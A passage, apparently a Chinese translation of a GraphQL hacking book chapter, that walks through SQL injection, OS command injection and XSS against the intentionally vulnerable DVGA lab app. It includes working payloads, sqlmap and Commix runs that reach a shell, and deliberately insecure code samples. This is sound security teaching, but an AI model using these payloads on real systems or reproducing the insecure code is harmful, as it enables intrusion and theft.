  \ Send to Repeater 将请求发送到 Burp Suite 的 Repeater。然后点击 Repeater 选项卡查看捕获的请求。这允许你按需重放请求。\n\
  \n让我们更改查询以使用 filter 参数。首先，将查询修改为如下所示：\n\n```\nquery {\n  pastes(filter:\"My First\
  \ Paste\") {\n    id\n    content\n    title\n  }\n}\n```\n\n图 8-6：Burp Suite 中的历史\
  \ WebSocket 流量视图\n\n请注意，当查询包含双引号时，我们必须在 Burp 中使用反斜杠 (\\ ) 字符转义引号，如图 8-7 所示。\n\n\
  ![](img/2f244b00cd9f8f37cfc22f928aaa471a_225_0.png)\n\n图 8-7：使用 Burp Repeater 发送修改后的\
  \ GraphQL 查询\n\n> NOTE\n> 如果你使用的是 Burp Suite 的授权专业版，可以从 Burp 的 BApp Store 安装 GraphQL\
  \ Raider 插件。Raider 允许你直接在 Burp Suite 中发送原生 GraphQL 查询，而无需担心字符转义。\n\n点击 Send 将查询发送到\
  \ GraphQL 服务器。作为对此查询的响应，我们应该收到一个与我们的过滤搜索模式匹配的粘贴。更具体地说，它匹配 content 字段：\n\n```\n\"\
  pastes\": [\n  {\n    --snip--\n    \"title\":\"Testing Testing\",\n    \"content\"\
  :\"My First Paste\"\n    --snip--\n  }\n]\n```\n\n此过滤搜索模式表明幕后可能正在发生某种 SQL 查询，并且该查询的行为类似于以下内容：\n\
  \n```\nSELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'\n\
  ```\n\n此 SQL 查询将从 pastes SQL 表中返回 id、content 和 title 列。使用 WHERE 运算符，结果将被过滤，仅返回 content\
  \ 中包含字符串 My First Paste 的粘贴，如 LIKE 运算符所定义。\n\n我们希望向应用程序投放一些字符，这些字符可能会破坏此查询并导致错误，这可能表明应用程序将我们的输入直接发送到查询中。例如，如果我们在搜索字符串后添加一个单引号\
  \ (')，SQL 查询就会被破坏，因为这会导致一个孤立的开头单引号而没有对应的闭合单引号。\n\n让我们向 DVGA 发送以下查询，看看收到的响应（请注意单引号的添加）：\n\
  \n```\nquery {\n  pastes(filter:\"My First Paste'\") {\n    id\n    content\n  \
  \  title\n  }\n}\n```\n\n在 Burp 中，修改请求使其看起来像图 8-8 所示。GraphQL 应返回包含应用程序错误的响应，通过 errors\
  \ JSON 键揭示一些有趣的信息。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_227_0.png)\n\n图 8-8：使用\
  \ Burp Suite 通过单引号破坏 SQL 查询\n\n看起来我们的字符串导致 SQL 查询变得无效，因为它被直接注入到 SQL LIKE 搜索模式中。应用程序没有转义我们引入的单引号，这使我们能够完全破坏\
  \ SQL 查询。因此，SQLite（运行 DVGA 的 SQL 引擎）会抛出错误，正如错误输出中字符串 sqlite3.OperationalError 所显示的那样。\n\
  \n> NOTE 除了我们刚刚识别出的潜在 SQLi 漏洞外，这也是一个信息泄露漏洞，因为应用程序没有优雅地处理错误。泄露数据库信息的应用程序错误很有价值，因为它们为我们提供了数据库模式结构的洞察，例如后端数据库中存在哪些列或表。此信息可以帮助我们构建更精确的\
  \ SQLi 命令。\n\n所以，我们认为我们找到了一个 SQLi 漏洞。那又怎样？好吧，我们可以通过更改 SQL 查询来检查是否能够从数据库中获取额外信息，例如返回所有粘贴：\n\
  \n```\nquery {\n  pastes(filter:\"My First Paste' or 1=1--\") {\n    title\n   \
  \ content\n  }\n}\n```\n\n现在 GraphQL 在解析传入的 GraphQL 查询后查询数据库时使用的 SQL 语句可能如下所示：\n\
  \n```\nSELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'\
  \ or 1=1--'\n```\n\n通过添加单引号，我们在 My First Paste 过滤模式之后立即结束 SQL LIKE 运算符。然后我们可以通过添加\
  \ 1=1 比较引入一个使 SQL 查询始终为真的 or 条件。我们通过使用 SQL 中的注释双破折号 (--) 语法结束 SQL 查询，这会注释掉查询末尾的单引号，从而有效地确保我们的语法在修改后仍然有效。\n\
  \n图 8-9 显示了 Burp Suite 中此 SQLi 查询的外观及其结果。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_228_0.png)\n\
  \n图 8-9：使用 Burp Suite 成功进行 SQL 注入\n\n服务器响应包含 DVGA 数据库中的所有粘贴！这是一个基于布尔的 SQLi 示例。\n\
  \n## 自动化 SQL 注入\n\n其他工具尝试自动化 SQLi 漏洞的检测。特别是，SQLmap 可以帮助使用针对各种数据库引擎（如 MySQL、PostgreSQL、SQLite\
  \ 等）定制的有效载荷模糊测试 GraphQL API。\n\n在执行 SQLi 测试时，你可以采用任何潜在的 GraphQL 查询并使用星号 (*) 标记 SQLmap\
  \ 应注入有效载荷的特定位置。例如，考虑以下片段：\n\n```\nquery {\n  pastes(filter:\"test*\") {\n    id\n\
  \  }\n}\n```\n\n在此示例中，SQLmap 将用其 SQLi 有效载荷数据库中的条目替换星号。\n\nSQLmap 可以从文件中读取完整的 HTTP\
  \ 请求。我们可以获取任何 HTTP 请求并将其输入 SQLmap，SQLmap 将读取查询并使用它执行 SQL。图 8-10 显示了如何在 Burp Suite\
  \ 中将请求保存到文件。右键单击请求窗口中的任意位置并选择 Copy to File。将文件命名为 request.txt 并保存。\n\n\n\n\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_229_0.png)\n\
  \n图 8-10：从 Burp Suite 将 HTTP 请求保存到文件\n\n接下来，使用 -r（request）参数运行 SQLmap 来指定文件。将目标数据库引擎参数（--dbms）设置为\
  \ sqlite。通过提供数据库引擎名称，我们将执行的测试数量缩小到仅相关的子集，从而加快注入测试的过程。清单 8-3 显示了如何运行该命令。\n\n```\n\
  # sqlmap -r request.txt --dbms=sqlite --tables\n```\n\n```\n[14:30:53] [INFO] parsing\
  \ HTTP request from 'request.txt'\ncustom injection marker ('*') found in POST body.\
  \ Do you want to process it? [Y/n/q] Y\n\nJSON data found in POST body. Do you want\
  \ to process it? [Y/n/q] n\n\n[14:30:55] [INFO] testing connection to the target\
  \ URL\nit is recommended to perform only basic UNION tests if there is not at least\
  \ one other (potential) technique found. Do you want to reduce the number of requests?\
  \ [Y/n] Y\n\n[14:30:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'\n\
  (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others\
  \ (if any)? [y/N] N\n\nParameter: #1* ((custom) POST)\n    Type: UNION query\n \
  \   Title: Generic UNION query (NULL) - 1 column\n    Payload: {\"query\":\"query\
  \ getPastes {\\n            pastes(filter:\\\"test' UNION ALL SELECT CHAR(113,122,98,122,113)||CHAR(102,90,76,111,106,97,117,117,105,113,101,121,72,117,112,87,114,99,114,65,99,86,84,120,72,69,115,122,120,77,121,119,122,103,108,116,87,100,114,82)||CHAR(113,122,98,98,113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,-bgJM\\\
  \") {\\n            id\\n            title\\n            content\\n            ipAddr\\\
  n            userAgent\\n            owner {\\n                name\\n         \
  \   }\\n        }\\n    }\"\n```\n\n清单 8-3：SQLmap 成功注入输出\n\nSQLmap 通知我们它找到了我们的星号标记\
  \ (*) 并询问是否要处理它。输入 Y。工具随后指出它在 request.txt 文件中发现了 JSON 数据，并询问是否应将其解释为 JSON。输入 N，因为\
  \ GraphQL 语法可能会混淆 SQLmap。接下来，它建议减少请求数量并仅使用基本的 UNION 测试。输入 Y。测试发现我们的参数存在漏洞，因此输入 N\
  \ 以指示 SQLmap 不再执行任何其他测试。工具还突出显示了导致成功注入的有效载荷。\n\n现在我们可以使用 --tables 参数收集数据库信息，这将列出\
  \ DVGA 中的数据库表，如清单 8-4 所示。\n\n```\n# sqlmap -r request.txt --dbms=sqlite --tables\n\
  \n[14:34:05] [INFO] fetching tables for database: 'SQLite_masterdb'\n<current>\n\
  [5 tables]\n+----------+\n| audits   |\n| owners   |\n| pastes   |\n| servermode\
  \ |\n| users    |\n+----------+\n```\n\n清单 8-4：使用 SQLmap 列出 DVGA 数据库中的表\n\n正如你所见，我们已返回\
  \ DVGA 中各个组件的表。干得好！我们既手动又自动地识别出了 SQL 注入漏洞。\n\n## 操作系统命令注入\n\n操作系统（OS）命令注入漏洞是指影响应用程序底层操作系统的注入，当用户输入被插入到系统\
  \ shell 命令中时就会发生。这种情况允许我们引入额外的参数或突破指定的命令并运行我们控制的命令。\n\n与 SQLi 类似，OS 命令注入也可能对应用程序造成严重后果，使攻击者能够执行以下操作：\n\
  \n- 枚举本地服务、进程、用户和组\n- 泄露本地文件系统文件，例如敏感配置文件、数据库文件等\n- 通过使服务器回调到我们的远程 shell 来获得远程访问权限\n\
  - 使用专用恶意软件将服务器转变为攻击发起平台\n- 将服务器转变为加密货币矿机\n\nOS 命令注入实际上可以让我们在服务器上执行系统管理任务，通常是在 Web\
  \ 应用程序用户的上下文中。Web 服务器通常在诸如 www-data、apache、nginx 之类的 Unix 账户下运行，如果运气非常好，则是 root\
  \ 用户。\n\n应用程序通常设计为使用系统 shell 库来执行后端任务。例如，应用程序可能需要使用 ping 命令检查远程服务器是否存活，或使用 wget\
  \ 命令下载文件。它还可能使用 zip、tar 或 gunzip 等命令压缩文件，或使用 cp 或 rsync 等命令备份文件系统。\n\n仅仅使用系统实用程序并不一定表明存在\
  \ OS 命令注入漏洞，但如果应用程序运行的系统实用程序命令可以受任意用户输入的影响，情况就会变得危险。在进行源代码审查时，请查找以下导入的库和函数，并查看其命令是否使用自定义用户输入构建：\n\
  \n- Python 库如 subprocess 和 os 以及 exec 和 eval 等函数\n- PHP 函数如 system、shell_exec、eval\
  \ 和 exec\n- Java 函数如 Runtime.exec()\n- Node.js 模块如 child_process 以及 exec 和 spawn\
  \ 等函数\n\n### 一个示例\n\n假设一个应用程序允许用户提供一个 URL，然后将其下载到自己的文件系统中。考虑以下 Flask 中的函数作为示例，Flask\
  \ 是一个用 Python 编写的 Web 框架：\n\n```\n@app.route('/download', methods=['POST'])\ndef\
  \ download():\n    ① url = request.form['url']\n    ② os.system('wget {} -P /data/downloads'.format(url))\n\
  \    return redirect('/dashboard')\n```\n\n此代码片段是一个 Python Web 应用程序路由，公开了一个名为 /download\
  \ 的端点。此端点支持通过 HTTP POST 方法传入的请求。\n\n在 ① 处，应用程序通过网站上的 HTML 表单获取用户输入并将其分配给 url 变量。在\
  \ ② 处，url 变量在 wget 命令的上下文中使用，从而有效地允许 wget 使用 url 变量下载文件。下载的文件随后存储在服务器文件系统的 /data/downloads\
  \ 文件夹下。因此，如果客户端提供类似 http://example.com/file.zip 的 URL，Web 应用程序将执行以下 shell 命令：\n\n\
  ```\nwget http://example.com/file.zip -P /data/downloads\n```\n\n这里存在多个问题。首先，应用程序允许提供任何\
  \ URL。没有检查来验证输入是否 even 采用有效的 URL 格式。其次，客户端可以提供内部 URL 或私有 IP 地址，以识别和访问内部受限资源，这也可能导致服务器端请求伪造（SSRF）漏洞（有关\
  \ SSRF 漏洞的更多信息请参见第 9 章）。此外，由于应用程序将客户端输入直接插入到 wget 命令中，我们可以引入任何我们想要的 shell 命令。我们还可以使用分号（;）字符来中断或分隔\
  \ wget 命令并启动新命令，从而有效地执行 OS 命令注入。这可能导致服务器完全被攻破。\n\n### DVGA 中的手动测试\n\n在 GraphQL 中，如果解析器函数接受来自\
  \ GraphQL 字段的参数但未对输入实施必要的验证，则可能发生 OS 命令注入。让我们在 DVGA 中探索其外观。\n\n回到我们之前审查的模式文档，我们有四个感兴趣的字段，它们都以\
  \ system 开头：systemUpdate、systemHealth、systemDiagnostics 和 systemDebug。虽然字段名称可能因应用程序而异，但\
  \ system 这个词通常暗示底层使用了系统 shell 命令，因此探索它们以查找 OS 命令注入是值得的。\n\n如果你曾经对家用路由器进行过渗透测试，你会知道其调试或诊断页面可能是寻找影响重大的漏洞最有趣的地方。OS\
  \ 命令注入通常存在于这些接口中，因为它们在底层使用 ping 或 traceroute 等网络实用程序。家用路由器并不以安全性著称；它们几乎从不检查危险字符的输入，并且通常容易受到\
  \ OS 命令注入的影响。\n\n在本节中，我们将重点关注 systemDebug。在 Altair 中运行以下命令，看看我们得到的响应类型：\n\n```\n\
  query {\n  systemDebug\n}\n```\n\n如果你做过一点 Linux 系统管理，你可能会认出以下输出片段；它来自 ps 命令，该命令显示有关正在运行的系统和用户进程的信息：\n\
  \n```\n\"systemDebug\": \"    PID TTY          TIME CMD\\n 11999 pts/1    00:00:00\
  \ bash\\n 14050 pts/1    00:00:00 python3\\n 14055 pts/1    00:00:03 python3\\n\
  \ 14135 pts/1    00:00:00 sh\\n 14136 pts/1    00:00:00 ps\\n\"\n```\n\n在 Altair\
  \ 中打开 Docs 页面。在 Queries 下，你会注意到 systemDebug 接受一个名为 arg 的单个参数，其类型为 String，这看起来很有希望。GraphQL\
  \ 查询解析器是否将此参数直接发送到 ps 命令？让我们来看看：\n\n```\nquery {\n  systemDebug(arg:\"ef\")\n}\n\
  ```\n\n\n\n\n\n现在输出看起来有点不同。这是因为 e 和 f 是 ps 命令接受的两个有效参数，它们会改变输出的格式。e 参数会显示系统上的所有进程，而\
  \ f 会将输出格式更改为完整格式列表。\n\n看起来 arg 参数会将我们的输入与 ps 命令连接起来。我们可以通过修改 arg 来尝试引入自己的命令，方法是添加分号字符（;），然后跟上我们选择的另一个\
  \ Linux 命令，例如 uptime：\n\n```\nquery {\n  systemDebug(arg:\"; uptime\")\n}\n```\n\
  \n现在我们得到了不同的输出。看起来它包含了来自 GraphQL 服务器的系统信息，证实了我们的假设，即操作系统命令注入是可能的：\n\n```\nPID TTY\
  \        TIME CMD\\n 11999 pts/1    00:00:00 bash\\n 14050 pts/1 1 user,  load average:\
  \ 0.71, 0.84, 0.91\\n\"\n```\n\n接下来，我们将探讨如何通过利用专门的命令注入框架，更有效地测试操作系统命令注入。\n\n## 使用\
  \ Commix 进行自动化测试\n\n到目前为止，我们一直采用手动方法来识别操作系统命令注入漏洞。然而，有时这些漏洞并不会那么容易找到和利用。例如，一些应用程序可能会限制它们接受的字符类型，使得在诸如查询参数等位置注入命令变得更加困难。或者，目标\
  \ GraphQL API 与我们之间可能存在防火墙，阻止危险字符被接受。这些安全控制使得使用手动测试方法来识别漏洞变得困难，而手动测试方法耗时耗力。\n\n\
  自动化命令注入有助于测试许多字符变体，直到找到正确的逻辑。例如，命令注入可以通过引入以下字符中的任何一个来实现，其中包括：\n\n- 分号（;）用于分隔命令\n\
  - 单个与号（&）将第一个命令发送到后台并继续执行我们引入的第二个命令\n- 双与号（&&）在第一个命令成功完成（返回 true）后运行第二个命令，充当 AND\
  \ 条件\n- 双竖线（||）在第一个命令未成功完成（返回 false）后运行第二个命令，充当 OR 条件\n\n通过使用自动化注入工具，我们可以用很少或没有的精力测试这些字符。\n\
  \nCommix 是一个跨平台的操作系统命令注入框架，能够在应用程序中查找和利用这些漏洞。Commix 通过模糊测试各种应用程序输入并检查服务器响应中指示成功注入的模式来实现其功能。Commix\
  \ 还可以通过推断来识别成功的注入尝试，例如通过向命令添加延迟并通过使用 sleep 来计时响应。\n\n让我们再回顾一下 GraphQL systemDebug\
  \ 字段，该字段允许我们通过其 arg 参数注入操作系统命令。假设在渗透测试中，我们尚未及时确定如何利用应用程序，但认为那里可能有东西可供探索。我们可以使用 Commix\
  \ 来扩展我们的攻击，通过尝试数十种有效负载变体并节省宝贵的时间。\n\n列表 8-5 中的 Commix 命令展示了如何针对目标应用程序运行注入测试：\n\n\
  ```\n# commix --url=\"http://127.0.0.1:5013/graphql\"\n--data='{\"query\":\"query{systemDebug(arg:\\\
  \"test \\\")}\"}' -p arg\n\n[info] Testing connection to the target URL.\nYou have\
  \ not declared cookie(s), while server wants to set its own.\n\nDo you want to use\
  \ those [Y/n] > Y\n[info] Performing identification checks to the target URL.\n\
  Do you recognize the server’s operating system? [(W)indows/(U)nix/(q)uit] > U\n\
  JSON data found in POST data. Do you want to process it? [Y/n] > Y\nIt appears that\
  \ the value 'query{systemDebug(arg:\\\"test\\\")}' has boundaries.\nDo you want\
  \ to inject inside? [Y/n] > Y\n\n[info] Testing the (results-based) classic command\
  \ injection technique.\n[info] The POST (JSON) parameter 'arg' seems injectable\
  \ via (results-based) classic command injection technique.\n|_ echo UTKFLI$( (13+45))$(echo\
  \ UTKFLI)UTKFLI\n\nDo you want a Pseudo-Terminal shell? [Y/n] > Y\nPseudo-Terminal\
  \ (type '?' for available options)\n\ncommix(os_shell) > ls\n\n__pycache__ app.py\
  \ config.py core db dvga.db pastes requirements.txt setup.py static templates version.py\n\
  ```\n\n列表 8-5：使用 Commix 进行成功的 GraphQL 操作系统命令注入\n\n我们使用 GraphQL 查询 systemDebug 以及\
  \ arg 参数，通过使用 GraphQL 目标 URL http://localhost:5013/graphql 来指定 GraphQL 目标 URL。然后我们使用\
  \ -p 标志来指示 Commix 在特定的 arg 占位符处注入有效负载。\n\nCommix 识别出服务器想要设置 HTTP cookie。我们通过在命令行输入\
  \ Y 来接受它。Commix 然后需要知道远程服务器运行的操作系统类型，以便它可以从其数据库中选择相关的有效负载。例如，Linux 服务器需要的注入有效负载与\
  \ Windows 服务器不同。我们通过指定字符 U 来选择 Unix 选项。\n\n接下来，我们指示 Commix 处理来自 GraphQL 服务器的 JSON\
  \ 响应。我们指定我们想要在命令边界内注入有效负载。Commix 信号显示它发现 arg 参数是可注入的。它通过将 echo 命令插入其中以及一个唯一的字符串来识别这一点。如果响应包含此唯一字符串，则意味着代码已成功注入。\n\
  \n我们在其中生成一个伪终端 shell，以便向服务器发送 Unix 命令。最后，我们发送 ls 命令来测试我们是否可以使用我们的 shell 与服务器交互并列出其文件。我们可以看到列出了一些文件，这意味着我们已成功执行了操作系统命令注入。\n\
  \n正如你所见，Commix 提供了针对 GraphQL API 运行一系列注入测试的非常方便的方法。\n\n## 解析器函数的代码审查\n\n让我们审查一下\
  \ systemDebug 的解析器函数在 DVGA 中的实现方式（列表 8-6）。这应该有助于我们更好地理解我们发现的操作系统命令注入漏洞的根本原因。\n\n\
  ```\ndef resolve_system_debug(self, info, arg=None):\n    Audit.create_audit_entry(info)\n\
  \    if arg:\n        output = helpers.run_cmd('ps {} '.format(arg))\n    else:\n\
  \        output = helpers.run_cmd('ps')\n    return output\n```\n\n列表 8-6：DVGA 中的解析器函数\n\
  \nresolve_system_debug() Python 函数处理 GraphQL 字段 systemDebug。它接受一个名为 arg 的单个可选参数。如果客户端在查询中未设置参数，则默认值为\
  \ None。\n\n在此函数内部，helpers.run_cmd() 函数运行 ps 系统 shell 命令，如果 arg 不为 None，则将其与 arg\
  \ 值连接。如果客户端提供参数 ef，则命令 effectively 变为以下内容：\n\n```\noutput = helpers.run_cmd('ps\
  \ ef')\n```\n\n如果客户端未向 arg 参数提供任何值，则该函数仅自行运行命令 ps，返回系统上正在运行的进程列表。\n\n这里的漏洞在于，对提供的参数\
  \ arg 没有任何安全检查，因此解析器函数将执行它收到的任何 Linux 命令。这可以通过多种方式缓解：\n\n- 仅接受字母字符（a 到 z）并确保这些是有效的\
  \ ps 参数\n- 删除任何可能允许攻击者引入额外命令的危险字符\n- 以无特权用户身份运行命令，以减少注入可能发生时的风险\n- 使用专用内置库而不是直接使用\
  \ shell 命令，例如 Python 中的 `psutil` 库\n\n> NOTE\n> 网站 GTFOBins（https://gtfobins.github.io）在执行操作系统命令注入时是一个有用的资源。如果您可以通过\
  \ GraphQL API 部分或完全控制一个二进制文件，您可以在 GTFOBins 数据库中查找二进制文件的名称，以了解它如何被滥用以突破 shell 或提升权限。\n\
  \n到目前为止，我们讨论了当存在时会影响服务器的注入漏洞。接下来，我们将探讨一些会影响客户端的注入漏洞。\n\n## 跨站脚本\n\n注入漏洞也会影响客户端。想象一下社交媒体网站上的个人资料更新页面，允许用户更改他们的全名和个人简介。如果应用程序不对此输入执行任何安全验证，我们就可以尝试使用一些\
  \ GraphQL 突变来提交恶意 JavaScript 代码到页面，并在其他客户端访问我们的个人资料时在页面上呈现。能够在客户端浏览器上执行 JavaScript\
  \ 非常强大，因为它允许我们将浏览器信息（例如 cookie）外泄到远程服务器并获得可以劫持客户端会话的敏感会话令牌。\n\n跨站脚本（XSS）漏洞发生在客户端代码（例如\
  \ JavaScript）在网络浏览器的上下文中被解释和执行时。这种类型的漏洞自 1990 年代就已报告，但 30 多年后我们仍然看到它。\n\n如果你已经熟悉\
  \ XSS 漏洞，你会发现它们在 GraphQL 中与 REST 等其他 API 技术并没有太大不同。本节简要解释了 XSS 漏洞的主要类型：反射型、存储型和基于\
  \ DOM 的。然后我们将探索 DVGA 中的 XSS 漏洞，以便你可以在 GraphQL API 中获得识别它们的经验。\n\n### 反射型 XSS\n\n\
  也许是所有 XSS 漏洞中最简单的，反射型 XSS 发生在输入提交到服务器并在立即响应中返回给客户端时，例如在 HTML 错误消息中或在 HTML 页面内容中。\n\
  \n从攻击者角度来看，利用反射型 XSS 漏洞需要通过社会工程手段诱使受害者点击触发 XSS 有效负载的链接，导致攻击者的 JavaScript 代码在受害者的浏览器中运行。\n\
  \n\n\n\n\n在 GraphQL 的上下文中，一个容易受到反射型 XSS 攻击的查询可能看起来如下：\n\n```\nquery {\n  hello(msg:\"\
  Black Hat GraphQL\")\n}\n```\n\n这个 hello 操作接收一个 msg 参数，该参数接受来自客户端的输入——在本例中为字符串 Black\
  \ Hat GraphQL。当客户端提交此信息时，服务器将渲染页面并可能打印类似 Hello Black Hat GraphQL! 的消息。\n\n现在，假设我们将\
  \ msg 参数值更改为 JavaScript 有效载荷：\n\n```\nquery {\n  hello(msg:\"<script>document.cookie;</script>\"\
  )\n}\n```\n\n当这在客户端浏览器中被渲染时，<script> 标签将指示浏览器调用 document JavaScript 对象并打印 cookie\
  \ 字符串。Cookie 通常包含与会话相关的信息，例如标识符。\n\n由于此信息并未存储在服务器的任何数据库中，而是作为对查询的响应反射回客户端，因此 XSS\
  \ 属于反射类型。我们可以通过让受害者的浏览器将其 cookie 发送到我们控制的远程服务器来改进有效载荷，从而允许我们窃取用户的 cookie。\n\n我们之前提到过，此攻击需要社会工程才能发挥作用。例如，通过钓鱼邮件，我们可以向受害者发送包含我们恶意\
  \ JavaScript 有效载荷的 URL，然后等待他们点击它。\n\n你可能会问自己，使用 POST 请求时这会如何工作？嗯，书中前面提到过 GraphQL\
  \ 可能支持基于 GET 的查询，因此你可以尝试构造如下链接并测试目标 GraphQL 服务器是否支持基于 GET 的查询：\n\n```\nhttp://example.com/graphql?query=query%20%7B%0A%20%20hello(msg%3A%22hello%22)%0A%7D\n\
  ```\n\n该 URL 解码后如下所示：\n\n```\nhttp://example.com/graphql?query=query {\n  hello(msg:\"\
  hello\")\n}\n```\n\n支持基于 GET 查询的 GraphQL API 将接受一个 query GET 参数，后跟查询语法。查询操作可以是查询或变更。受害者点击此链接时将使用\
  \ GET 请求提交 GraphQL 查询。在第 9 章中，你将了解基于 GET 的查询如何也被利用来执行跨站请求伪造（CSRF）攻击。\n\n## 存储型 XSS\n\
  \n在存储型或持久型 XSS 中，注入的有效载荷会被持久化到数据存储中，例如数据库，而不是作为对查询的响应反射回客户端。因此，与反射型 XSS 不同，存储型 XSS\
  \ 漏洞会在客户端浏览器每次加载包含恶意有效载荷的页面时触发注入的脚本。\n\n通常，存储型 XSS 漏洞被认为比反射型 XSS 更危险。XSS 有效载荷存在于应用程序的数据存储中可能会对其他系统构成风险，例如以下情况：\n\
  \n- 其他从与 GraphQL 应用程序相同的数据库读取恶意输入的服务器。这些服务器实际上会受到相同的漏洞利用影响。\n- 同一 GraphQL 应用程序中从同一数据存储读取的其他流程。漏洞利用会影响应用程序的其他部分，从而影响其他客户端。\n\
  \n图 8-11 显示了存储型 XSS 如何影响其他系统。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_238_0.png)\n\
  \n图 8-11：存储型 XSS 漏洞影响相邻应用程序\n\n我们的恶意输入可能会遍历网络上的许多设备和资源；在首次命中 GraphQL API 层后，它可能会被插入到不同的数据存储中，例如缓存数据库、关系数据库或本地文件。\n\
  \n从那里，我们不总是知道漏洞利用尝试是否成功。通常我们需要等待某物（或某人）触发我们的有效载荷。想象一下，我们使用 GraphQL 变更发送 JavaScript\
  \ 有效载荷，然后没有收到任何表明它已被应用程序作为 JavaScript 代码成功渲染的指示。有多种解释是可能的。例如，我们可能已将有效载荷注入到仅由具有不同访问级别的应用程序用户读取的数据库表中。\n\
  \n联系表单提供了一个很好的例子。假设你向最近购买商品的商店的反馈表单中提交了一个有效载荷并\n\n收到 Thank you for your submission\
  \ 消息。即使你没有收到漏洞利用尝试成功的任何指示，你的攻击也不一定是死路一条。有效载荷可能只有在商店打开反馈表单后才会触发。这可能发生在几天甚至几周后。我们称这些隐藏攻击为盲\
  \ XSS，是存储型 XSS 的一个子类别。\n\n为了利用盲 XSS 漏洞，你可以使用生成唯一有效载荷进行测试的工具。当发现 XSS 漏洞并且有效载荷被触发时，有效载荷将向中央服务器发送探测以供进一步检查，从而允许你捕获有效载荷执行客户端的信息。其中一种工具是\
  \ XSS Hunter（https://xss-hunter.com）。在你的 XSS 有效载荷触发时通知你的工具非常方便。\n\n## 基于 DOM 的 XSS\n\
  \n文档对象模型-based XSS，或 DOM-based，漏洞发生在 JavaScript 注入有效载荷仅在浏览器 DOM 内执行时。DOM 是网页文档的表示形式，允许应用程序修改其结构、内容和样式。所有\
  \ HTML 对象都可以使用 DOM API 进行操作。\n\n例如，document 对象可用于获取网页中的 HTML <title> 标签。在 DVGA 的\
  \ Web 界面中，打开浏览器的开发者工具并在 Console 选项卡中输入命令 document.title。你应该会看到以下结果：\n\n```\n# document.title\n\
  \n'Damn Vulnerable GraphQL Application'\n```\n\n虽然反射型 XSS 和存储型 XSS 源于服务器端代码中的漏洞，但\
  \ DOM XSS 漏洞通常源于面向客户端的前端应用程序代码中的漏洞。例如，当恶意输入可以被插入（通常作为 URL 的一部分）并传递给支持动态代码执行的组件时就会发生这种情况，例如\
  \ JavaScript 的 eval 函数。\n\n由于 DOM XSS 漏洞发生在客户端代码中，GraphQL API 并不是此类漏洞的根本原因。尽管如此，我们认为了解它们很重要，因为社区构建的\
  \ GraphQL 客户端可能容易受到此类漏洞的影响。有关可用的 GraphQL 客户端库的完整列表，请访问 https://graphql.org/code/#javascript-client。\n\
  \n## 在 DVGA 中测试 XSS\n\n在本节中，我们将使用 DVGA 的用户界面执行 XSS 测试。DVGA 中实现了大量 XSS 漏洞，因此我们可以通过多种方式实现\
  \ XSS。我们将探索一些技术，让你熟悉使用 GraphQL 查询进行 XSS 测试。\n\n### NOTE\n本节要求你将 JavaScript 有效载荷插入\
  \ DVGA，这可能会干扰其 Web 界面。别担心；有一切恢复的方法。通过点击用户图标然后选择 Rollback DVGA 将 DVGA 恢复到最后一次已知良好状态。这将重建数据库并重新加载应用程序。或者，你可以拍摄虚拟机快照并在需要时恢复它。\n\
  \n在实验室中打开你的 Web 浏览器并导航到 DVGA 的主界面 http://localhost:5013。\n\n## 篡改审计页面\n\n作为第一步，点击左侧边栏上的一些页面，例如\
  \ Public Pastes。你的浏览器将开始发送 GraphQL 查询以用信息填充网页。接下来，点击右上角的用户图标；然后点击 Audit。你应该能够看到列出的审计事件，如图\
  \ 8-12 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_240_0.png)\n\n图 8-12：DVGA\
  \ 中的审计跟踪\n\n此 Audit 页面表明应用程序正在自动跟踪我们在浏览页面时浏览器发送的每个查询，收集以下信息等：\n\n- 行为者或用户名称（在本例中为\
  \ DVGAUser）\n- 使用的 GraphQL 操作名称（在本例中为 getPastes）\n- 执行的查询（在本例中为使用 public 参数的 pastes\
  \ GraphQL 字段以及一些选定字段，例如 id、title 和 content）\n\n此输入完全在我们控制之下。让我们首先探索如何篡改 GraphQL\
  \ 操作以影响 Audit 页面。将以下查询复制并粘贴到 Altair 中并运行它：\n\n```\nmutation SpoofedOperationName\
  \ {\n  createPaste(title:\"Black Hat GraphQL\", content:\"I just spoofed the operation\
  \ name.\") {\n    paste {\n```\n\n\n\n\n\n该 mutation 创建了一个标题为 Black Hat GraphQL\
  \ 且内容为我刚刚伪造的操作名的新 paste。同时，我们返回了新创建的 paste 的 content 和 title 字段，其值应完全相同。\n\n刷新 Audit\
  \ 页面。你应该能看到它现在在 GraphQL Operation 列下显示了我们伪造的操作名 SpoofedOperationName，如图 8-13 所示。这就是安全分析人员在尝试使用操作名监控\
  \ GraphQL 查询时可能会看到的情况。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_241_0.png)\n\n\
  图 8-13：Audit 页面显示 DVGA 中被修改的操作名\n\n正如我们之前提到的，不同的 GraphQL 服务器实现可能允许操作名包含特殊字符，这可能成为注入向量，因此在可能的情况下务必始终测试这些情况。\n\
  \n## 在 CreatePaste Mutation 中寻找存储型 XSS\n\n当我们在 DVGA 中创建新 paste 时，用于 createPaste\
  \ mutation 的 GraphQL 字段，例如 title 和 content，会显示在 Public Pastes 页面上。图 8-14 中的截图显示了它看起来像什么。\n\
  \n![](img/2f244b00cd9f8f37cfc22f928aaa471a_241_1.png)\n\n图 8-14：DVGA 中 paste 的结构和内容\n\
  \n正如你所见，我们的 paste 显示在网页上。这是一个很好的机会，可以开始使用诸如 JavaScript 代码之类的输入测试 createPaste 字段，以查看数据是否在\
  \ Web 界面中安全渲染。\n\n继续使用第 8-7 节中所示的 mutation 查询创建一个新的 paste。\n\n```\nmutation {\n\
  \  createPaste(title:\"XSS\", content:\"<script>alert(\\\"XSS\\\")</script>\") {\n\
  \    paste {\n      title\n      content\n    }\n  }\n}\n```\n\n清单 8-7：使用 createPaste\
  \ mutation 注入 XSS 有效载荷\n\n此 mutation 创建了一个新的 paste，其中 content 参数包含 JavaScript <script>\
  \ 标签。如果应用程序容易受到 XSS 攻击，此代码将在浏览器中渲染，并弹出一个带有消息 XSS 的 alert 消息框。发送此 mutation 查询后，前往\
